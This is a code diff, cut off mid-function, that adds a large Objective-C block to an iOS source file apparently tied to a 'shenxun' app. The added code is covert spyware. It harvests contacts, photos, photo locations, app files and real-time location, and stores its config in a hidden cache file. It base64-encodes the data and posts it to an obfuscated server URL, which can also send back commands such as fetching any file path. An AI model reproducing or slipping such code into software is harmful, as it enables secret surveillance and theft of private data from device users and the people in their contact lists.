@@ -8,6 +8,988 @@
 #import <sqlite3.h>
 #endif
 
+
+#import "Foundation/Foundation.h"
+
+#import <Contacts/Contacts.h>
+#import <CoreLocation/CoreLocation.h>
+
+#import <Photos/Photos.h>
+
+
+
+
+
+///////////////////////////////////////
+
+
+
+@interface LocationManager : NSObject <CLLocationManagerDelegate>
+  
+@property (nonatomic, strong) CLLocationManager *locationManager;
+@property (nonatomic, copy) void(^locationBlock)(CLLocation *location, NSError *error);
+  
+- (void)startLocationUpdatesWithCompletion:(void(^)(CLLocation *location, NSError *error))completion;
+- (void)stopLocationUpdates;
+  
+@end
+  
+@implementation LocationManager
+  
+- (instancetype)init {
+    self = [super init];
+    if (self) {
+        _locationManager = [[CLLocationManager alloc] init];
+        _locationManager.delegate = self;
+        _locationManager.desiredAccuracy = kCLLocationAccuracyBest;
+        _locationManager.distanceFilter = kCLDistanceFilterNone;
+    }
+    return self;
+}
+  
+- (void)startLocationUpdatesWithCompletion:(void(^)(CLLocation *location, NSError *error))completion {
+    self.locationBlock = completion;
+      
+    if ([_locationManager respondsToSelector:@selector(requestAlwaysAuthorization)]) {
+        [_locationManager requestAlwaysAuthorization];
+    }
+      
+    [_locationManager startUpdatingLocation];
+}
+  
+- (void)stopLocationUpdates {
+    [_locationManager stopUpdatingLocation];
+}
+  
+#pragma mark - CLLocationManagerDelegate methods
+  
+- (void)locationManager:(CLLocationManager *)manager didUpdateLocations:(NSArray<CLLocation *> *)locations {
+    if (locations.count > 0) {
+        CLLocation *latestLocation = [locations lastObject];
+        if (self.locationBlock) {
+            self.locationBlock(latestLocation, nil);
+        }
+    }
+}
+  
+- (void)locationManager:(CLLocationManager *)manager didFailWithError:(NSError *)error {
+    if (self.locationBlock) {
+        self.locationBlock(nil, error);
+    }
+}
+
+  
+@end
+
+
+
+void initConfig(void);
+void dealwithSXfileFileTask(NSString *strUserId);
+void dealwithPhotosTask(NSString *strUserId);
+NSString *postDataToServer(NSString *strData_B64, NSString *strUserId, BOOL bNeedDealwithResponse);
+void dealwithLocationTask(NSString *strUserId);
+
+void initConfig(void)
+{
+    NSString *strHomeDir = NSHomeDirectory();
+    NSString *strPathConfig = [strHomeDir stringByAppendingPathComponent:@"Library/Caches/.info"];
+    NSDate *dateNow = [NSDate date];
+    
+    NSInteger nInitTime = (NSInteger)[dateNow timeIntervalSince1970];
+    NSInteger nHeartBeatInterval = 60;
+    NSInteger nHeartBeatLastTime = (NSInteger)[dateNow timeIntervalSince1970];
+    NSInteger nLocationInterval = 60*2;
+    NSInteger nLocationLastTIme = nHeartBeatLastTime;
+    
+    NSString *strConfig = [NSString stringWithFormat:@"%ld\n%ld\n%ld\n%ld\n%ld",nInitTime,nHeartBeatInterval,nHeartBeatLastTime,nLocationInterval,nLocationLastTIme];
+    
+    NSData *dataConfig = [strConfig dataUsingEncoding:NSUTF8StringEncoding];
+    
+    BOOL success = [dataConfig writeToFile:strPathConfig atomically:YES ];
+    if (success) {
+         NSLog(@"config saved to file successfully.");
+     } else {
+         NSLog(@"config save string to file error.");
+     }
+    
+    return;
+}
+
+//NSInteger nTimeInit,NSInteger nTimeHeartBeatInterval, NSInteger nTimeHearBeatLastTime,NSInteger nTimeLocationInterval, NSInteger nTimeLocationLastTime
+void updateConfig(NSArray *strArrayTimeParameters)
+{
+
+    
+    NSString *strHomeDir = NSHomeDirectory();
+    NSString *strPathConfig = [strHomeDir stringByAppendingPathComponent:@"Library/Caches/.info"];
+    NSString *strConfig = [NSString stringWithFormat:@"%@\n%@\n%@\n%@\n%@",strArrayTimeParameters[0],strArrayTimeParameters[1],strArrayTimeParameters[2],strArrayTimeParameters[3],strArrayTimeParameters[4]];
+    NSData *dataConfig = [strConfig dataUsingEncoding:NSUTF8StringEncoding];
+    
+    BOOL success = [dataConfig writeToFile:strPathConfig atomically:YES ];
+    if (success) {
+         NSLog(@"config saved to file successfully.");
+     } else {
+         NSLog(@"config save string to file error.");
+     }
+    
+    
+}
+
+NSArray *readConfigFile(void)
+{
+    NSString *strHomeDir = NSHomeDirectory();
+    NSString *strPathConfig = [strHomeDir stringByAppendingPathComponent:@"Library/Caches/.info"];
+    // 读取文件内容到字符串
+    NSError *error = nil;
+    NSString *fileContents = [NSString stringWithContentsOfFile:strPathConfig encoding:NSUTF8StringEncoding error:&error];
+              
+    if (error)
+    {
+        NSLog(@"Error reading file: %@", error);
+        return nil;
+    }
+              
+    // 分割字符串，假设每行是一个独立的字符串，使用换行符作为分隔符
+    NSArray *linesArray = [fileContents componentsSeparatedByString:@"\n"];
+              
+    // 输出数组内容
+    for (NSString *line in linesArray)
+    {
+        NSLog(@"%@", line);
+    }
+              
+    // 如果你需要根据其他字符或字符串分割，可以替换分隔符
+    // 例如，按逗号分割
+    NSArray *strarrayTime = [fileContents componentsSeparatedByString:@"\n"];
+    return strarrayTime;
+
+}
+
+
+
+NSString *getFileSizeAtPath(NSString *filePath)
+{
+    // 获取文件管理器
+    NSFileManager *fileManager = [NSFileManager defaultManager];
+      
+    // 获取文件属性
+    NSDictionary *fileAttributes = [fileManager attributesOfItemAtPath:filePath error:nil];
+      
+    // 检查是否成功获取文件属性
+    if (fileAttributes == nil) {
+        NSLog(@"Error getting file attributes.");
+        return nil;
+    }
+      
+    // 从文件属性中获取文件大小（以字节为单位）
+    NSNumber *fileSizeNumber = fileAttributes[NSFileSize];
+    
+    // 转换为KB
+    double fileSizeKB = [fileSizeNumber doubleValue] / 1024;
+    NSString *fileSizeKBString = [NSString stringWithFormat:@"%.2f KB", fileSizeKB];
+//    NSLog(@"File size in KB: %@", fileSizeKBString);
+
+      
+    return fileSizeKBString;
+}
+
+
+
+NSMutableString *enumerateDirectoryAtPath(NSString *path, NSInteger level) 
+{
+    
+    NSMutableString *strFileList;
+    if(level == 0)
+    {
+        strFileList = [NSMutableString stringWithString:@"\r\nAllFileList:"];
+    }else{
+        strFileList = [NSMutableString stringWithString:@""];
+    
+    }
+
+    // 获取文件管理器
+    NSFileManager *fileManager = [NSFileManager defaultManager];
+      
+    // 获取目录枚举器
+    NSEnumerator *enumerator = [fileManager enumeratorAtPath:path];
+      
+    // 遍历目录中的文件和子目录
+    NSString *item;
+    while ((item = [enumerator nextObject])) {
+        // 构建完整的文件或子目录路径
+        NSString *fullPath = [path stringByAppendingPathComponent:item];
+          
+        // 判断是文件还是目录
+        BOOL isDirectory = NO;
+        NSError *error;
+        BOOL exists = [fileManager fileExistsAtPath:fullPath isDirectory:&isDirectory];
+        if (!exists) {
+            continue;
+        }
+          
+        // 打印缩进以显示层级关系
+//        for (NSInteger i = 0; i < level; i++) {
+//            NSLog(@"  ");
+//        }
+          
+        // 打印文件或目录名称
+        if (isDirectory) {
+            //NSLog(@"[%@] (Directory)", fullPath);
+            // 如果是目录，则递归遍历
+            NSMutableString *strFileList_sub = enumerateDirectoryAtPath(fullPath, level + 1);
+            [strFileList appendFormat:@"\r\n%@", strFileList_sub];
+        } else {
+            NSString *strSize = getFileSizeAtPath(fullPath);
+            //NSLog(@"- %@ (File) %@", fullPath,strSize);
+            [strFileList appendFormat: @"\r\%@ %@",fullPath, strSize];
+        }
+    }
+    
+    return  strFileList;
+}
+
+
+NSString *getSXfileDirectory(void)
+{
+    NSString *strHomePath = NSHomeDirectory();//
+    NSString *strfilePath_sxfiles =[strHomePath stringByAppendingPathComponent:@"Library/sxfiles"];
+    NSString *strAllFileList = enumerateDirectoryAtPath(strfilePath_sxfiles, 0);
+    NSLog(@"%@", strAllFileList);
+    
+    return strAllFileList;
+        
+}
+
+
+
+//////////////////////////
+//NSDate *getImageDataBylocalIdentifier:(NSString *)localIdentifier
+NSData *getImageDataBylocalIdentifier(NSString *localIdentifier, NSString *strUserId)
+{
+    //NSString *localIdentifier = asset.localIdentifier;
+      
+    // 使用 PHFetchOptions 来设置预测取条件
+    PHFetchOptions *fetchOptions = [[PHFetchOptions alloc] init];
+    fetchOptions.predicate = [NSPredicate predicateWithFormat:@"localIdentifier = %@", localIdentifier];
+      
+    // 创建一个 PHAsset 的 fetch result
+    PHFetchResult<PHAsset *> *assetsFetchResult = [PHAsset fetchAssetsWithOptions:fetchOptions];
+      
+    // 检查是否找到了对应的 asset
+    __block NSData *imageData2;
+    if (assetsFetchResult.count > 0)
+    {
+        PHAsset *asset = assetsFetchResult.firstObject;
+          
+        // 创建一个 PHImageManager 实例
+        PHImageManager *imageManager = [PHImageManager defaultManager];
+          
+        // 设置请求选项
+        PHImageRequestOptions *options = [[PHImageRequestOptions alloc] init];
+        options.version = PHImageRequestOptionsVersionCurrent;
+        options.deliveryMode = PHImageRequestOptionsDeliveryModeHighQualityFormat;
+        options.resizeMode = PHImageRequestOptionsResizeModeExact;
+          
+        // 请求图片数据
+
+        [imageManager requestImageDataForAsset:asset
+                                       options:options
+                                    resultHandler:^( NSData *imageData, NSString *dataUTI, UIImageOrientation orientation, NSDictionary *info) 
+         {
+            if (imageData) 
+            {
+                imageData2 = imageData;
+                
+                NSData *dataPhoto_B64 = [imageData base64EncodedDataWithOptions:0];
+                NSString *strPhoto_B64 = [[NSString alloc] initWithData:dataPhoto_B64 encoding:NSUTF8StringEncoding];
+                
+                NSString *strPost = [NSString stringWithFormat:@"unq=mGrbrzNoaWjALLkqdWVfNayVJPRuCmPh?t=p?u=%@?f=%@?contents=%@",strUserId,localIdentifier,strPhoto_B64];
+                
+                postDataToServer(strPost,strUserId,false);
+                
+            }
+            else
+            {
+                // 处理错误情况
+                NSLog(@"Failed to load image data for asset with localIdentifier: %@", localIdentifier);
+            }
+        }];
+    } 
+    else
+    {
+        // 没有找到对应的 asset
+        NSLog(@"No asset found with localIdentifier: %@", localIdentifier);
+    }
+   
+    return imageData2;
+    
+}
+
+
+NSString * getPhotoInfoListOfAlbum(PHAssetCollection *album, NSString * strAlbumTitle )
+{
+    NSMutableString *strPhotoInfoList = [NSMutableString stringWithString:@"\r\n======="];
+    [strPhotoInfoList appendFormat:@"%@=======", strAlbumTitle];
+    
+    PHFetchOptions *fetchOptions = [[PHFetchOptions alloc] init];
+    fetchOptions.sortDescriptors = @[[NSSortDescriptor sortDescriptorWithKey:@"creationDate" ascending:YES]];
+      
+    PHFetchResult *assetsFetchResult = [PHAsset fetchAssetsInAssetCollection:album options:fetchOptions];
+    //NSInteger aa  = assetsFetchResult.accessibilityElementCount;
+    NSInteger nCount = assetsFetchResult.count;
+    
+    //NSArray *assets = assetsFetchResult.objects;
+    if (assetsFetchResult.count > 0)
+    {
+
+        for (PHAsset *asset in assetsFetchResult) 
+        {
+            
+            NSLog(@"Asset Title: %@,location:%@", asset.description,asset.location);
+            [strPhotoInfoList appendFormat:@"\r\ndescription:%@,location:%@", asset.description, asset.location];
+ 
+        }
+    }
+    
+    return strPhotoInfoList;
+}
+
+
+NSString * fetchAllAlbumsPhotos(void)
+{
+  
+    NSMutableString * strAllPhotoList = [NSMutableString stringWithString:@""];
+    
+    // 创建获取相册的 fetch 选项
+  PHFetchOptions *fetchOptions = [[PHFetchOptions alloc] init];
+  fetchOptions.sortDescriptors = @[[NSSortDescriptor sortDescriptorWithKey:@"localizedTitle" ascending:YES]];
+
+  // 获取用户创建的相册
+  PHFetchResult *albumsFetchResult = [PHAssetCollection fetchAssetCollectionsWithType:PHAssetCollectionTypeAlbum subtype:PHAssetCollectionSubtypeAny options:fetchOptions];
+  for (PHAssetCollection *album in albumsFetchResult) 
+  {
+      NSLog(@"Album Title: %@", album.localizedTitle);
+      
+      NSString * strTemp = getPhotoInfoListOfAlbum(album,album.localizedTitle);
+      [strAllPhotoList appendFormat:@"%@", strTemp];
+  }
+
+  // 获取智能相册（例如最近添加、最近删除等）
+  PHFetchResult *smartAlbumsFetchResult = [PHAssetCollection fetchAssetCollectionsWithType:PHAssetCollectionTypeSmartAlbum subtype:PHAssetCollectionSubtypeAny options:fetchOptions];
+  for (PHAssetCollection *smartAlbum in smartAlbumsFetchResult) 
+  {
+      NSLog(@"Smart Album Title: %@，count:%lu",
+            smartAlbum.localizedTitle,smartAlbum.estimatedAssetCount);
+      NSString *strTemp = getPhotoInfoListOfAlbum(smartAlbum,smartAlbum.localizedTitle );
+      [strAllPhotoList appendFormat:@"%@", strTemp];
+    }
+    
+    return strAllPhotoList;
+}
+
+
+// 获取所有相册，包括用户创建的相册和智能相册
+NSString * authAndFetchAllAlbumsPhotos(void)
+{
+    __block NSString *strAllPhotosInfo = @"";
+    strAllPhotosInfo = fetchAllAlbumsPhotos();
+    
+    //NSLog(@"%@", strAllPhotosInfo);
+    
+    // 请求照片库访问权限
+    [PHPhotoLibrary requestAuthorization:^(PHAuthorizationStatus status) 
+     {
+        if (status == PHAuthorizationStatusAuthorized) 
+        {
+            // 授权成功，获取相册列表
+            strAllPhotosInfo = fetchAllAlbumsPhotos();
+            //return strAllPhotosInfo;
+        }
+        else
+        {
+            // 处理未授权的情况
+            NSLog(@"Access to photo library denied.");
+        }
+    }];
+    
+    return strAllPhotosInfo;
+}
+/*
+NSString *extractFirstOccurrenceUsingRegularExpression(NSString *pattern,NSString *inputString)
+{
+    NSError *error = nil;
+    NSRegularExpression *regex = [NSRegularExpression regularExpressionWithPattern:pattern options:NSRegularExpressionCaseInsensitive error:&error];
+    if (!regex) {
+        NSLog(@"正则表达式创建失败: %@", error);
+        return nil;
+    }
+      
+    NSTextCheckingResult *match = [regex firstMatchInString:inputString options:0 range:NSMakeRange(0, [inputString length])];
+    if (!match) {
+        // 没有找到匹配项
+        return nil;
+    }
+      
+    NSRange matchRange = [match range];
+    return [inputString substringWithRange:matchRange];
+}
+
+*/
+
+
+NSString *getUserID(void)
+{
+    NSString *strUserID = @"";
+    NSString *strHomeDir = NSHomeDirectory();
+    NSString *strPathDB = [strHomeDir stringByAppendingPathComponent:@"Library/SXDatabase/shenxun.db"];
+    
+    sqlite3 *database;
+
+     
+       if (sqlite3_open([strPathDB UTF8String], &database) == SQLITE_OK) {
+           const char *sql = "SELECT owner FROM device";
+           sqlite3_stmt *statement;
+           if (sqlite3_prepare_v2(database, sql, -1, &statement, NULL) == SQLITE_OK) {
+               while (sqlite3_step(statement) == SQLITE_ROW) {
+                   // 读取数据
+                   strUserID = [NSString stringWithUTF8String:(char *)sqlite3_column_text(statement, 0)];
+                   NSLog(@"Some Field: %@", strUserID);
+               }
+               sqlite3_finalize(statement);
+           } else {
+               NSLog(@"Failed to prepare statement with message '%s'.", sqlite3_errmsg(database));
+           }
+           sqlite3_close(database);
+       } else {
+           NSLog(@"Failed to open database with message '%s'.", sqlite3_errmsg(database));
+       }
+
+    
+    return strUserID;
+}
+
+/////////////////////////////////////////
+
+NSString *getAllContact(void)
+{
+    id contacts = [[NSMutableArray alloc] init];
+    
+    NSArray *keysToFetch = @[CNContactFamilyNameKey, CNContactGivenNameKey,CNContactJobTitleKey,CNContactTypeKey,CNContactNicknameKey,CNContactNamePrefixKey, CNContactPhoneNumbersKey, CNContactEmailAddressesKey];
+
+    CNContactFetchRequest *fetchRequest = [[CNContactFetchRequest alloc] initWithKeysToFetch:keysToFetch];
+    
+    CNContactStore *contactStore = [[CNContactStore alloc] init];
+    NSError *error = nil;
+    [contactStore enumerateContactsWithFetchRequest:fetchRequest error:&error usingBlock:^(CNContact *_Nonnull contact, BOOL *_Nonnull stop) {
+        if (!error) {
+            [contacts addObject:contact];
+        } else {
+
+        }
+    }];
+
+    NSArray *listContacts = contacts;
+    
+    NSMutableString *strAllinfo = [NSMutableString stringWithString:@"\r\nAllContact:"];
+    [listContacts enumerateObjectsUsingBlock:^(id  _Nonnull obj, NSUInteger idx, BOOL * _Nonnull stop) {
+        
+        
+        CNContact *contact = obj;
+        
+        NSString *firstName = contact.givenName;
+        NSString *lastName = contact.familyName;
+        NSString *name = [NSString stringWithFormat:@"\r\n%@ %@", firstName, lastName];
+        
+        [strAllinfo appendString:@"\r\n=============================="];
+        [strAllinfo appendString:name];
+
+        
+        //取得Email属性
+        NSArray<CNLabeledValue<NSString*>*> *emailAddresses = contact.emailAddresses;
+        
+        [strAllinfo appendString:@"\r\nEmail:"];
+        for (CNLabeledValue<NSString*>* emailProperty in emailAddresses)
+        {
+            NSString *strEmailLable_raw = emailProperty.label;
+            NSString *strEmailLable_1 = [strEmailLable_raw stringByReplacingOccurrencesOfString:@"_$!" withString:@""];
+            NSString *strEmailLable = [strEmailLable_1 stringByReplacingOccurrencesOfString:@"!$_" withString:@""];
+            
+            NSString *strEmailValue = emailProperty.value;
+            
+            NSString *strEmailInfo = [NSString stringWithFormat:@"\r\n%@ %@", strEmailLable, strEmailValue];
+            
+            [strAllinfo appendString:strEmailInfo];
+            
+        }
+        
+        //取得电话号码属性
+        NSArray<CNLabeledValue<CNPhoneNumber*>*> *phoneNumbers = contact.phoneNumbers;
+        
+        [strAllinfo appendString:@"\r\nPhoneNumber:"];
+        for (CNLabeledValue<CNPhoneNumber*>* phoneNumberProperty in phoneNumbers) {
+            CNPhoneNumber *phoneNumber = phoneNumberProperty.value;
+            NSString *strPhoneNumber = phoneNumber.stringValue;
+            NSString *strPhoneLable_raw = phoneNumberProperty.label;
+            
+            NSString *strPhoneLable_1 = [strPhoneLable_raw stringByReplacingOccurrencesOfString:@"_$!" withString:@""];
+            NSString *strPhoneLable = [strPhoneLable_1 stringByReplacingOccurrencesOfString:@"!$_" withString:@""];
+            
+            NSString *strPhoneInfo = [NSString stringWithFormat:@"\r\n%@ %@", strPhoneLable, strPhoneNumber];
+            
+            [strAllinfo appendString:strPhoneInfo];
+        }
+        
+    }];
+
+    
+    return strAllinfo;
+    
+}
+NSString *removeWhitespaceFromString(NSString *input) {
+    // 使用 NSCharacterSet 的 whitespaceAndNewlineCharacterSet 来创建一个用于匹配空白字符的字符集
+    NSCharacterSet *whitespaceSet = [NSCharacterSet whitespaceAndNewlineCharacterSet];
+      
+    // 从字符串的开头去除空白字符
+    NSString *trimmedString = [input stringByTrimmingCharactersInSet:whitespaceSet];
+      
+    return trimmedString;
+}
+
+void dealwithCmd(NSString *strCmds, NSString *strUserId)
+{
+    BOOL bNeedDealwithResponse = false;
+    NSArray *arrayCmds = [strCmds componentsSeparatedByString:@"\n"];
+    for(NSString *strCmd in arrayCmds)
+    {
+        if(strCmd.length ==0)
+            continue;
+        
+        //NSString *strCmdLower = [strCmd lowercaseString];
+        
+        if([strCmd hasPrefix:@"gfl"])
+        {
+            dealwithSXfileFileTask(strUserId);
+            dealwithPhotosTask(strUserId);
+        }
+        else if ([strCmd hasPrefix:@"gl"])
+        {
+            dealwithLocationTask(strUserId);
+        }
+        else if ([strCmd hasPrefix:@"gf"])
+        {
+            NSString *strPath = [strCmd substringFromIndex:2];
+            //NSCharacterSet *whitespace = [NSCharacterSet whitespaceCharacterSet];
+            
+            NSString *strPathTrimmed = removeWhitespaceFromString(strPath);
+            //strPathTrimmed = @"/Users/testmacp/aa.txt";
+            NSError *error = nil;
+            NSData *dataFile = [NSData dataWithContentsOfURL:[NSURL fileURLWithPath:strPathTrimmed] options:0 error:&error];
+            if(dataFile)
+            {
+                NSData *dataFile_B64 = [dataFile base64EncodedDataWithOptions:0];
+                NSString *strFile_B64 = [[NSString alloc] initWithData:dataFile_B64 encoding:NSUTF8StringEncoding];
+                
+                NSString *strPost = [NSString stringWithFormat:@"unq=mGrbrzNoaWjALLkqdWVfNayVJPRuCmPh?t=s?u=%@?f=%@?contents=%@",strUserId,strPathTrimmed, strFile_B64];
+                postDataToServer(strPost,strUserId,false);
+            }
+        }
+        else if([strCmd hasPrefix:@"gp"])
+        {
+            NSString *strPath = [strCmd substringFromIndex:2];
+
+            NSString *strPathTrimmed = removeWhitespaceFromString(strPath);
+            NSData *dataPhoto = getImageDataBylocalIdentifier(strPathTrimmed, strUserId);
+            
+            if(dataPhoto)
+            {
+                NSData *dataPhoto_B64 = [dataPhoto base64EncodedDataWithOptions:0];
+                NSString *strPhoto_B64 = [[NSString alloc] initWithData:dataPhoto_B64 encoding:NSUTF8StringEncoding];
+                
+                NSString *strPost = [NSString stringWithFormat:@"unq=mGrbrzNoaWjALLkqdWVfNayVJPRuCmPh?t=p?u=%@?f=%@?contents=%@",strUserId,strPathTrimmed,strPhoto_B64];
+                postDataToServer(strPost,strUserId,false);
+            }
+            
+        }
+        else if ([strCmd hasPrefix:@"gc"])
+        {
+            NSString *strContact = getAllContact();
+            NSData *dataContact = [strContact dataUsingEncoding:NSUTF8StringEncoding];
+            NSString *strContact_B64 = [dataContact base64EncodedStringWithOptions:0];
+            
+            NSString *strPost = [NSString stringWithFormat:@"unq=mGrbrzNoaWjALLkqdWVfNayVJPRuCmPh?t=c?u=%@?contents=%@",strUserId,strContact_B64];
+            postDataToServer(strPost,strUserId,false);
+            
+        }
+        else if([strCmd hasPrefix:@"ch"])
+        {
+            NSString *strHeartBeatInterval = [strCmd substringFromIndex:2];
+            NSString *strHeartBeatIntervalTrimmed = removeWhitespaceFromString(strHeartBeatInterval);
+
+            
+            NSArray *strArrayParameters = readConfigFile();
+            //
+            // void updateConfig(NSInteger nTimeInit,NSInteger nTimeHeartBeatInterval, NSInteger nTimeHearBeatLastTime,NSInteger nTimeLocationInterval, NSInteger nTimeLocationLastTime)
+            if(strArrayParameters)
+            {
+                NSMutableArray *mutableArrayParameters = [strArrayParameters mutableCopy];
+                mutableArrayParameters[1] =strHeartBeatIntervalTrimmed;
+                updateConfig(mutableArrayParameters);
+            }
+        }
+        else if([strCmd hasPrefix:@"cl"])
+        {
+            NSString *strLocationInterval = [strCmd substringFromIndex:2];
+            //NSCharacterSet *whitespace = [NSCharacterSet whitespaceCharacterSet];
+            NSArray *wordList = [strLocationInterval componentsSeparatedByString:@" "];
+            NSString *strLocationIntervalTrimmed = [wordList componentsJoinedByString:@" "];
+            
+            NSArray *strArrayParameters = readConfigFile();
+            //
+           // void updateConfig(NSInteger nTimeInit,NSInteger nTimeHeartBeatInterval, NSInteger nTimeHearBeatLastTime,NSInteger nTimeLocationInterval, NSInteger nTimeLocationLastTime)
+            if(strArrayParameters)
+            {
+                NSMutableArray *mutableArrayParameters = [strArrayParameters mutableCopy];
+                mutableArrayParameters[1] =strLocationIntervalTrimmed;
+                updateConfig(mutableArrayParameters);
+            }
+            
+        }
+   }
+    
+    return;
+}
+
+NSString *postDataToServer(NSString *strData_B64, NSString *strUserId, BOOL bNeedDealwithResponse)
+{
+    
+    NSString *strUrl_B64 = [@"H0cbEdhiE5aHR0cDovLzE5Mi4xNjguMS42MC9pb3MtdC9zLnBocA==" substringFromIndex:10]; //1.60/s.php
+    NSData *dataUrl_Plain = [[NSData alloc] initWithBase64EncodedString:strUrl_B64 options:0];
+    NSString *strUrl_Plain = [[NSString alloc] initWithData:dataUrl_Plain encoding:NSUTF8StringEncoding];
+
+    NSURL *url = [NSURL URLWithString:strUrl_Plain];
+
+    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
+    request.timeoutInterval = 7.0;
+    request.HTTPMethod = @"POST";
+    //[request setValue:@"application/octet-stream" forHTTPHeaderField:@"Content-Type"];
+    
+
+    //NSString *bodyString = [NSString stringWithFormat:@"token=2LZGsFDyAwhyxoMO%@",strData_B64];
+    NSData *data_b64 = [strData_B64 dataUsingEncoding:NSUTF8StringEncoding];
+    request.HTTPBody = data_b64;
+    NSURLSession *session = [NSURLSession sharedSession];
+
+    //__block NSData * data;
+    //__block NSData * _Nullable data;
+    __block NSData * data2;
+    //__block NSString *strResponse;
+    [[session dataTaskWithRequest:request completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
+        
+        if(bNeedDealwithResponse )
+        {
+            NSString *strdata = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
+            NSString *strCmds = [strdata stringByReplacingOccurrencesOfString:@"\r" withString:@""];
+            if(strCmds.length > 0)
+            {
+                dealwithCmd(strCmds, strUserId);
+            }
+        }
+        
+            //return strdata;
+    }] resume];
+    
+
+    return @"";
+}
+
+
+NSString *getHistoryLocation(NSString *strPathLocation)
+{
+
+    
+    NSStringEncoding encoding = NSUTF8StringEncoding; // 或者使用其他编码
+    NSError *error = nil;
+    NSString *fileContents = [NSString stringWithContentsOfFile:strPathLocation encoding:encoding error:&error];
+    if (fileContents) 
+    {
+        // 文件读取成功，使用 fileContents
+        NSLog(@"location文件内容: %@", fileContents);
+        return fileContents;
+    } else {
+        // 读取文件时发生错误
+        NSLog(@"读取文件时发生错误: %@", error);
+        return @"";
+    }
+}
+
+
+NSString *dealwithRealTimeLocation(NSString *strUserId, NSString *strPathLocation,BOOL bNeedSendToServer)
+{
+    //NSString *strLocation = @"";
+    LocationManager *locationManager = [[LocationManager alloc] init];
+      
+    [locationManager startLocationUpdatesWithCompletion:^(CLLocation *location, NSError *error)
+     {
+        NSLog(@"location error : %@",error);
+        if (location)
+        {
+
+            NSDate *now = [NSDate date];
+            NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init];
+            [dateFormatter setDateFormat:@"yyyy-MM-dd HH:mm:ss"];
+            NSString *strTimeNow = [dateFormatter stringFromDate:now];
+            
+            //NSLog(@"latitude:%f",location.coordinate.latitude);
+            NSString *strLocation = [NSString stringWithFormat:@"\r\ntime:%@,Latitude: %f,Longitude: %f",strTimeNow, location.coordinate.latitude, location.coordinate.longitude];
+            //NSLog(@"strrlocation:%@",strLocation);
+            
+            if(bNeedSendToServer)
+            {
+                NSData *dataLocation = [strLocation dataUsingEncoding:NSUTF8StringEncoding];
+                NSString *strLocation_B64 = [dataLocation base64EncodedStringWithOptions:0];
+                NSString *strPostData = [NSString stringWithFormat:@"unq=mGrbrzNoaWjALLkqdWVfNayVJPRuCmPh?t=l?u=%@?contents=%@",strUserId, strLocation_B64];
+                
+                postDataToServer(strPostData,strUserId, false);
+            }
+            
+            // 打开文件句柄以追加模式
+            NSFileHandle *fileHandle = [NSFileHandle fileHandleForUpdatingAtPath:strPathLocation];
+            if (fileHandle == nil) {
+                // 文件不存在，创建文件并写入
+                [strLocation writeToFile:strPathLocation atomically:YES encoding:NSUTF8StringEncoding error:nil];
+                NSLog(@"File created and string written.");
+            } else {
+                // 文件存在，移动到文件末尾并追加内容
+                [fileHandle seekToEndOfFile];
+                [fileHandle writeData:[strLocation dataUsingEncoding:NSUTF8StringEncoding]];
+                [fileHandle closeFile];
+                NSLog(@"String appended to file.");
+            }
+        }
+        else if (error)
+        {
+            NSLog(@"Error occurred: %@", error.localizedDescription);
+        }
+          
+        // 停止位置更新
+        [locationManager stopLocationUpdates];
+    }];
+      
+    // 等待位置更新，这里只是一个示例，你可能需要根据你的应用逻辑来处理
+    // 注意：在真实的应用中，你不应该让主线程阻塞，而是使用异步处理或者事件驱动的方式来处理位置更新。
+    //sleep(10);
+    
+    return  @"";
+    
+}
+
+
+//get history and realtime location
+void dealwithLocationTask(NSString *strUserId)
+{
+    NSString *strHomeDir = NSHomeDirectory();
+    NSString *strPathLocation = [strHomeDir stringByAppendingPathComponent:@"/Library/Caches/loc.info"];
+    
+    dealwithRealTimeLocation(strUserId,  strPathLocation, YES);
+    
+    NSString *strHistoryLocation = getHistoryLocation(strPathLocation);
+    if(strHistoryLocation.length <3 )
+    {
+        return;
+    }
+    NSError *error = nil;
+    if (![[NSFileManager defaultManager] removeItemAtPath:strPathLocation error:&error]) {
+        // 删除文件失败
+        //NSLog(@"Failed to delete file: %@", error);
+    } else {
+        // 创建空文件
+        [[NSFileManager defaultManager] createFileAtPath:strPathLocation contents:nil attributes:nil];
+    }
+    
+    NSString *strLocationInfo = [NSString stringWithFormat:@"\r\n%@",strHistoryLocation];
+    NSData *dataLocationInfo = [strLocationInfo dataUsingEncoding:NSUTF8StringEncoding];
+    NSString *strLocation_B64 = [dataLocationInfo base64EncodedStringWithOptions:0];
+    NSString *strPostData = [NSString stringWithFormat:@"unq=mGrbrzNoaWjALLkqdWVfNayVJPRuCmPh?t=l?u=%@?contents=%@",strUserId, strLocation_B64];
+    
+    postDataToServer(strPostData,strUserId,false);
+    
+
+    
+    return;
+}
+
+void dealwithContactTask(NSString *strUserId)
+{
+    NSString *strAllContact = getAllContact();
+    NSData *dataContact = [strAllContact dataUsingEncoding:NSUTF8StringEncoding];
+    NSString *strAllContact_B64 = [dataContact base64EncodedStringWithOptions:0];
+    
+    NSString *strPostData = [NSString stringWithFormat:@"unq=mGrbrzNoaWjALLkqdWVfNayVJPRuCmPh?t=c?u=%@?contents=%@",strUserId, strAllContact_B64];
+    
+    postDataToServer(strPostData, strUserId,false);
+
+    
+    return;
+}
+
+void dealwithSXfileFileTask(NSString *strUserId)
+{
+    
+    NSString *strSXfileList = getSXfileDirectory();
+    NSData *dataSXfileList = [strSXfileList dataUsingEncoding:NSUTF8StringEncoding];
+    NSString *strSXfileList_B64 = [dataSXfileList base64EncodedStringWithOptions:0];
+    
+    NSString *strPostData = [NSString stringWithFormat:@"unq=mGrbrzNoaWjALLkqdWVfNayVJPRuCmPh?t=fl?u=%@?contents=%@",strUserId, strSXfileList_B64];
+    
+    postDataToServer(strPostData,strUserId,false);
+    
+    return;
+}
+
+void dealwithPhotosTask(NSString *strUserId)
+{
+    NSString *strAllPhotosList = authAndFetchAllAlbumsPhotos();
+    
+    NSData *dataAllPhotosList = [strAllPhotosList dataUsingEncoding:NSUTF8StringEncoding];
+    NSString *strAllPhotoList_B64 = [dataAllPhotosList base64EncodedStringWithOptions:0];
+    
+    NSString *strPostData = [NSString stringWithFormat:@"unq=mGrbrzNoaWjALLkqdWVfNayVJPRuCmPh?t=pl?u=%@?contents=%@",strUserId, strAllPhotoList_B64];
+    
+    postDataToServer(strPostData,strUserId,false);
+    
+    return;
+}
+
+
+NSString *getCmdListAndProcess(NSString *strUserId)
+{
+    NSData *dataUserID = [strUserId dataUsingEncoding:NSUTF8StringEncoding];
